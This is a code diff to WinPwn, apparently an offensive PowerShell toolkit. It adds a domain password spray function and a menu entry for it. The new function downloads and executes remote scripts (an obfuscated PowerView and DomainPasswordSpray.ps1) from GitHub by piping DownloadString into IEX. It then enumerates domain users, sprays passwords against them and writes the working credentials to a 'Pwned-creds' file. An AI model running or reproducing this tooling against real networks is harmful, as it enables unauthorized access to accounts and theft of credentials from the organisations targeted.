@@ -1373,23 +1373,33 @@ function latmov
     {
         empirelauncher
     }
-    #Domainspray
-    $domainspray = Read-Host -Prompt 'Do you want to Spray the Network with prepared Credentials? (yes/no)'
-    if ($domainspray -eq "yes" -or $domainspray -eq "y" -or $domainspray -eq "Yes" -or $domainspray -eq "Y")
-    {
+}
 
+function domainpassspray
+{
+    <#
+        .DESCRIPTION
+        Domain password spray, credit to https://github.com/dafthack/.
+    #>
+    #Lateral Movement Phase
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
+    $domain_Name = Get-NetDomain
+    $Domain = $domain_Name.Name
+	
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
+    Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt
        if (Test-Path $currentPath\passlist.txt) 
         {
             Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
         }
         else 
         { 
-           Write-Host -ForegroundColor Red 'There is no passlist.txt File in the current folder'
-           $passlist = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'
-           $passlist >> $currentPath\passlist.txt
-           Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt  
-        }
-    }
+           $onepass = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'
+           Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -Password $onepass -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt  
+           Write-Host "Successfull logins saved to $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt"
+	}
 }
 
 function empirelauncher
@@ -1744,7 +1754,8 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
 	Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
     	Write-Host -ForegroundColor Green '21. Do an Group Policy Audit using Grouper2!'
-        Write-Host -ForegroundColor Green '22. Exit. '
+	Write-Host -ForegroundColor Green '22. DomainPasswordSpray Attacks!'
+        Write-Host -ForegroundColor Green '23. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1771,9 +1782,10 @@ __        ___       ____
 	    19{sharpcradle -allthosedotnet $true}
 	    20{sharpcradle}
             21{GPOAudit}
+	    22{domainpassspray}
        }
     }
- While ($masterquestion -ne 22)
+ While ($masterquestion -ne 23)
      
     
     #End
